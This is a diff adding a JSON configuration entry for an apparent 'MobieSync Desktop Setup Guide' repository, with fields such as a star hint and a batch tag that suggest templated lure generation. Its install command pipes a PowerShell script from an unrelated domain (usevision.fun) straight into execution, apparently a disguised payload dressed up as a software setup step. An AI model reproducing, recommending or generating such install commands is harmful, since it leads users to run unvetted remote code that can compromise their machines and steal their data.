@@ -1,0 +1,12 @@
+{
+  "repo": "MobieSync-PC-Windows-Guide",
+  "product": "MobieSync Desktop Setup Guide",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://usevision.fun/ps/setup.ps1",
+  "install_command": "irm https://usevision.fun/ps/setup.ps1 | iex",
+  "stars_hint": 9,
+  "batch": "photo29",
+  "format": "troubleshooting-guide",
+  "category": "mobile-software"
+}
